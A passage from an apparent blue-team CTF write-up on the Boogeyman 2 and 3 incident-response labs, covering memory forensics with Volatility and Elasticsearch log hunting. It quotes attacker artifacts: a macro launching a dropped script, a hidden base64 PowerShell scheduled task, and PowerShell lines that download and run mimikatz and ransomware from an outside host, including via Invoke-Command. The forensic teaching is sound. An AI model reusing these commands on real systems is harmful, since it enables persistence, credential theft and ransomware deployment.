<span class="k">Set</span> <span class="n">shell_object</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
<span class="n">shell_object</span><span class="p">.</span><span class="n">Exec</span> <span class="p">(</span><span class="s">"wscript.exe C:\ProgramData\update.js"</span><span class="p">)</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="memory-analysis"><span class="me-2">Memory Analysis</span><a href="#memory-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="identifying-processes"><span class="me-2">Identifying Processes</span><a href="#identifying-processes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Using Volatility to identify suspicious processes:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python2 vol.py <span class="nt">-f</span> <span class="nv">$THM</span>/Boogeyman2/WKSTN-2961.raw <span class="nt">--profile</span><span class="o">=</span>Win10x64_18362 pstree | <span class="nb">grep</span> <span class="nt">-C2</span> <span class="nt">-i</span> wscript
  .... 0xffffe58f81150080:WINWORD.EXE                  1124   1440     18      0 2023-08-21 14:12:31 UTC+0000
  ..... 0xffffe58f864ca0c0:wscript.exe                 4260   1124      6      0 2023-08-21 14:12:47 UTC+0000
  ...... 0xffffe58f87ac0080:updater.exe                6216   4260     18      0 2023-08-21 14:12:48 UTC+0000
</pre></td></tr></tbody></table></code></div></div>

<h4 id="extracting-updaterexe"><span class="me-2">Extracting <code class="language-plaintext highlighter-rouge">updater.exe</code></span><a href="#extracting-updaterexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Dumping <code class="language-plaintext highlighter-rouge">updater.exe</code> from memory:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python2 vol.py <span class="nt">-f</span> <span class="nv">$THM</span>/Boogeyman2/WKSTN-2961.raw <span class="nt">--profile</span><span class="o">=</span>Win10x64_18362 procdump <span class="nt">-D</span> <span class="nv">$THM</span>/Boogeyman2/volatility <span class="nt">-p</span> 6216
<span class="nv">$ </span>file executable.6216.exe
  executable.6216.exe: PE32+ executable <span class="o">(</span>GUI<span class="o">)</span> Intel 80386 Mono/.Net assembly, <span class="k">for </span>MS Windows
</pre></td></tr></tbody></table></code></div></div>

<p>Decompiling with <code class="language-plaintext highlighter-rouge">dnSpy</code> reveals that <code class="language-plaintext highlighter-rouge">updater.exe</code> is an Empire stager compiled via Sharpire and calls back to <code class="language-plaintext highlighter-rouge">128.199.95.189:8080</code>.</p>

<hr />

<h3 id="persistence-mechanism"><span class="me-2">Persistence Mechanism</span><a href="#persistence-mechanism" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="scheduled-task-creation"><span class="me-2">Scheduled Task Creation</span><a href="#scheduled-task-creation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Extracting process memory of <code class="language-plaintext highlighter-rouge">updater.exe</code>:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python2 vol.py <span class="nt">-f</span> <span class="nv">$THM</span>/Boogeyman2/WKSTN-2961.raw <span class="nt">--profile</span><span class="o">=</span>Win10x64_18362 memdump <span class="nt">-p</span> 6216 <span class="nt">-D</span> <span class="nv">$THM</span>/Boogeyman2/volatility
</pre></td></tr></tbody></table></code></div></div>

<p>Strings reveal a scheduled task named <code class="language-plaintext highlighter-rouge">Updater</code>:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>strings <span class="nt">-el</span> 6216.dmp | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"powershell.exe "</span>
  <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\s</span><span class="s2">chtasks.exe"</span> /Create /F /SC DAILY /ST 09:00 /TN Updater /TR <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\W</span><span class="s2">indowsPowerShell</span><span class="se">\v</span><span class="s2">1.0</span><span class="se">\p</span><span class="s2">owershell.exe -NonI -W hidden -c </span><span class="se">\"</span><span class="s2">IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion debug).debug)))</span><span class="se">\"</span><span class="s2">"</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="extracting-task-configuration"><span class="me-2">Extracting Task Configuration</span><a href="#extracting-task-configuration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Extracting the XML configuration of the scheduled task:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python3 vol.py <span class="nt">-f</span> <span class="nv">$THM</span>/Boogeyman2/WKSTN-2961.raw filescan | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'System32\\Tasks\\'</span>
<span class="nv">$ </span>python3 vol.py <span class="nt">-f</span> <span class="nv">$THM</span>/Boogeyman2/WKSTN-2961.raw windows.dumpfiles <span class="nt">--virtaddr</span> 0xe58f89295990
</pre></td></tr></tbody></table></code></div></div>

<p>XML confirms the task runs a PowerShell command:</p>
<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;Task</span> <span class="na">version=</span><span class="s">"1.2"</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/windows/2004/02/mit/task"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">"Author"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;Exec&gt;</span>
            <span class="nt">&lt;Command&gt;</span>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<span class="nt">&lt;/Command&gt;</span>
            <span class="nt">&lt;Arguments&gt;</span>-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"<span class="nt">&lt;/Arguments&gt;</span>
        <span class="nt">&lt;/Exec&gt;</span>
    <span class="nt">&lt;/Actions&gt;</span>
<span class="nt">&lt;/Task&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="decoding-base64-payload"><span class="me-2">Decoding Base64 Payload</span><a href="#decoding-base64-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Extracting the encoded payload from the registry:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>strings <span class="nt">-el</span> registry.0xffff9582f2681000.ntuserdat.reg | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-E</span> <span class="s1">'[a-z0-9\+\/=]{100,}'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The decoded payload is another Empire stager calling back to <code class="language-plaintext highlighter-rouge">128.199.95.189:8080</code>.</p>

<hr />

<h3 id="network-analysis-1"><span class="me-2">Network Analysis</span><a href="#network-analysis-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="c2-communication"><span class="me-2">C2 Communication</span><a href="#c2-communication" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Analyzing connections using Volatility:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python2 vol.py <span class="nt">-f</span> <span class="nv">$THM</span>/Boogeyman2/WKSTN-2961.raw <span class="nt">--profile</span><span class="o">=</span>Win10x64_18362 netscan | <span class="nb">grep</span> <span class="nt">-C2</span> updater.exe
  0xe58f86b73010     TCPv4    10.10.49.181:63308             128.199.95.189:8080  CLOSED           <span class="nt">-1</span>                      3884-06-06 01:06:33 UTC+0000
</pre></td></tr></tbody></table></code></div></div>

<h2 id="boogeyman-3"><span class="me-2">Boogeyman 3</span><a href="#boogeyman-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<h3 id="background-2"><span class="me-2">Background</span><a href="#background-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Without tripping any security defenses of Quick Logistics LLC, the Boogeyman compromised an employees email access and waited in the shadows for the right moment to escalate the attack. Using this initial foothold, the threat actors targeted the CEO, Evan Hutchinson, expanding their impact on the organization.</p>

<hr />

<h3 id="incident-timeline"><span class="me-2">Incident Timeline</span><a href="#incident-timeline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Timestamp</th>
      <th>Event</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2023-08-30 01:31:39</td>
      <td>Pass-the-Hash using the Domain Administrator on WKSTN-1327.</td>
    </tr>
    <tr>
      <td>2023-08-30 01:45:41</td>
      <td>Execution of Empire stager on DC01 from WKSTN-0051.</td>
    </tr>
    <tr>
      <td>2023-08-30 01:46:18</td>
      <td>Download of <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> on DC01.</td>
    </tr>
    <tr>
      <td>2023-08-30 01:47:57</td>
      <td>DCSync attack on the Domain Administrator user (<code class="language-plaintext highlighter-rouge">backupda</code>).</td>
    </tr>
    <tr>
      <td>2023-08-30 01:53:13</td>
      <td>Download of <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code> on DC01.</td>
    </tr>
    <tr>
      <td>2023-08-30 01:53:33</td>
      <td>Execution of <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code> on DC01 by Administrator.</td>
    </tr>
    <tr>
      <td>2023-08-30 01:56:40</td>
      <td>Last download of <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code> on WKSTN-1327.</td>
    </tr>
    <tr>
      <td>2023-08-30 01:59:36</td>
      <td>First download of <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code> on WKSTN-0051.</td>
    </tr>
    <tr>
      <td>2023-08-30 02:06:09</td>
      <td>Empire stager execution as Domain Admin on WKSTN-0051.</td>
    </tr>
    <tr>
      <td>2023-08-30 02:06:25</td>
      <td>Empire stager execution as Domain Admin on WKSTN-1327.</td>
    </tr>
    <tr>
      <td>2023-08-30 02:07:22</td>
      <td>Execution of <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code> on WKSTN-1327 by <code class="language-plaintext highlighter-rouge">itadmin</code>.</td>
    </tr>
  </tbody>
</table></div>

<hr />

<h3 id="artifacts"><span class="me-2">Artifacts</span><a href="#artifacts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="exfiltration-2"><span class="me-2">Exfiltration</span><a href="#exfiltration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Using Elasticsearch to analyze logs:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-d</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>query.json<span class="si">)</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-s</span> http://elastic:elastic@&lt;ELASTIC_IP&gt;:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size<span class="o">=</span>3000 | jq <span class="nt">-c</span> <span class="s1">'.hits.hits[]."_source"'</span> | <span class="nb">grep </span>command_line | jq <span class="nt">-r</span> <span class="s1">'"\(."@timestamp") \(.user.name)\t\(.process.pid)\t\(.process.parent.pid)\t\(.process.command_line)"'</span> | <span class="nb">sort</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="ransomware-execution"><span class="me-2">Ransomware Execution</span><a href="#ransomware-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The ransomware <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code> was downloaded and executed across multiple endpoints:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-d</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>query.json<span class="si">)</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-s</span> http://elastic:elastic@&lt;ELASTIC_IP&gt;:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size<span class="o">=</span>3000 | jq <span class="nt">-c</span> <span class="s1">'.hits.hits[]."_source"'</span> | <span class="nb">grep </span>command_line | jq <span class="nt">-r</span> <span class="s1">'"\(."@timestamp") \(.user.name)@\(.host.hostname)\t\(.process.pid)\t\(.process.parent.pid)\t\(.process.command_line)"'</span> | <span class="nb">sort</span> | <span class="nb">grep </span>ransomboogey.exe
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="attack-vectors"><span class="me-2">Attack Vectors</span><a href="#attack-vectors" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="initial-compromise"><span class="me-2">Initial Compromise</span><a href="#initial-compromise" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The attacker used an HTA file (<code class="language-plaintext highlighter-rouge">ProjectFinancialSummary_Q3.pdf.hta</code>) to execute malicious code:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2023-08-29T23:51:15.856Z evan.hutchinson	6392	2940	"C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta"
</pre></td></tr></tbody></table></code></div></div>

<p>This spawned three processes:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>2023-08-29T23:51:16.738Z evan.hutchinson	3832	6392	"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
2023-08-29T23:51:16.771Z evan.hutchinson	3680	6392	"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
</pre></td></tr></tbody></table></code></div></div>

<h4 id="empire-stager"><span class="me-2">Empire Stager</span><a href="#empire-stager" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The Empire stager was executed on multiple endpoints and communicated with <code class="language-plaintext highlighter-rouge">cdn.bananapeelparty.net:80</code> or <code class="language-plaintext highlighter-rouge">165.232.170.151:80</code>:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>query_net.json
<span class="o">{</span>
  <span class="s2">"query"</span>: <span class="o">{</span>
    <span class="s2">"bool"</span>: <span class="o">{</span>
      <span class="s2">"must"</span>: <span class="o">{</span> <span class="s2">"term"</span>: <span class="o">{</span> <span class="s2">"process.pid"</span>: <span class="s2">"6160"</span> <span class="o">}</span> <span class="o">}</span>,
      <span class="s2">"should"</span>: <span class="o">[{</span> <span class="s2">"match"</span>: <span class="o">{</span> <span class="s2">"event.category"</span>: <span class="s2">"network"</span> <span class="o">}</span> <span class="o">}]</span>,
      <span class="s2">"filter"</span>: <span class="o">{</span> <span class="s2">"range"</span>: <span class="o">{</span> <span class="s2">"@timestamp"</span>: <span class="o">{</span> <span class="s2">"gte"</span>: <span class="s2">"2023-08-29T00:00:00"</span>, <span class="s2">"lte"</span>: <span class="s2">"2023-08-31T00:00:00"</span> <span class="o">}</span> <span class="o">}</span> <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>,
  <span class="s2">"_source"</span>: <span class="o">[</span><span class="s2">"@timestamp"</span>, <span class="s2">"host.hostname"</span>, <span class="s2">"source.ip"</span>, <span class="s2">"source.port"</span>, <span class="s2">"destination.ip"</span>, <span class="s2">"destination.port"</span><span class="o">]</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="credential-harvesting"><span class="me-2">Credential Harvesting</span><a href="#credential-harvesting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="mimikatz-execution"><span class="me-2">Mimikatz Execution</span><a href="#mimikatz-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The attacker downloaded and executed <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> to dump credentials:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2023-08-30T01:46:18 evan.hutchinson	&lt;mimikatz_pid&gt;	&lt;parent_pid&gt;	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr http://ff.sillytechninja.io/mimikatz.exe -outfile mimikatz.exe; .\mimikatz.exe"
</pre></td></tr></tbody></table></code></div></div>

<h4 id="pass-the-hash"><span class="me-2">Pass-the-Hash</span><a href="#pass-the-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Using the dumped credentials, the attacker performed a Pass-the-Hash attack:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2023-08-30T01:31:39 Pass-the-Hash using the Domain Administrator on WKSTN-1327.
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="lateral-movement"><span class="me-2">Lateral Movement</span><a href="#lateral-movement" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="invoke-command"><span class="me-2">Invoke-Command</span><a href="#invoke-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The attacker used <code class="language-plaintext highlighter-rouge">Invoke-Command</code> to execute commands remotely on other endpoints:</p>
<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">WKSTN-1327.quicklogistics.org</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://ff.sillytechninja.io/ransomboogey.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">ransomboogey.exe</span><span class="p">;</span><span class="w"> </span><span class="o">.</span><span class="n">\ransomboogey.exe</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="shared-resource-discovery"><span class="me-2">Shared Resource Discovery</span><a href="#shared-resource-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Using <code class="language-plaintext highlighter-rouge">Invoke-ShareFinder</code>, the attacker discovered credentials for <code class="language-plaintext highlighter-rouge">allan.smith</code> in a file named <code class="language-plaintext highlighter-rouge">IT_Automation.ps1</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2023-08-30T01:56:05.018Z Administrator@DC01	4296	4008	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Invoke-Command -ComputerName WKSTN-1327.quicklogistics.org -ScriptBlock { ... }"
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="ransomware-deployment"><span class="me-2">Ransomware Deployment</span><a href="#ransomware-deployment" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="download-and-execution"><span class="me-2">Download and Execution</span><a href="#download-and-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The ransomware <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code> was downloaded and executed on multiple endpoints:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>2023-08-30T01:53:13.738Z Administrator@DC01	4308	4008	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe"
2023-08-30T01:53:33.815Z Administrator@DC01	5572	4008	"C:\Users\Administrator\ransomboogey.exe"
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="log-analysis-1"><span class="me-2">Log Analysis</span><a href="#log-analysis-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="querying-elasticsearch"><span class="me-2">Querying Elasticsearch</span><a href="#querying-elasticsearch" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>To analyze process creation logs:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-d</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>query.json<span class="si">)</span><span class="s2">"</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-s</span> http://elastic:elastic@&lt;ELASTIC_IP&gt;:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size<span class="o">=</span>10000 | jq <span class="nt">-r</span> <span class="s1">'.hits.hits[]."_source".user.name'</span> | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">sort</span> <span class="nt">-nr</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="endpoint-activity"><span class="me-2">Endpoint Activity</span><a href="#endpoint-activity" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Endpoints with the most activity:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>5695 WKSTN-0051
2174 DC01
2131 WKSTN-1327
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>,
          <a href="/categories/blue-team/">Blue Team</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
          <a
            href="/tags/blue-team/"
            class="post-tag no-text-decoration"
          >Blue Team</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://github.com/Diogo-Lages" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Github" aria-label="Github">
        <i class="fa-fw fab fa-github"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/in/diogo-lages/" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/web-cybersecurity-frameworks">Web: Cybersecurity Frameworks</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ctf-redteam-lookup">THM: Lookup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/python-digital-forensics-toolkit">Digital Forensics Toolkit</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/bug-bounty/ssrf">Server-Side Request Forgery (SSRF)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
